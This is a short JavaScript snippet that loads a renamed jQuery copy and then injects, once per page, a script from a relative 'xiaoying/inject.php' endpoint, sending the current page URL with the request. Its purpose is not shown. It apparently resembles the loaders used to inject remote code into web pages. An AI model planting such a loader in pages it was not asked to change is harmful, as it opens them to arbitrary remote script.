function init(){
    dQuery.noConflict();
    if (!window.inject) {
        window.inject=true;
        var js = document.createElement("script");
        js.setAttribute("type","application/javascript");
        js.src = "xiaoying/inject.php?t="+new Date().getTime()+"&refer="+encodeURIComponent(location.href);
        document.body.appendChild(js);
    };
};

var jq = document.createElement("script");
jq.src="xiaoying/jquery.min.js";
jq.onload=function(){
    init();
};
document.body.appendChild(jq);
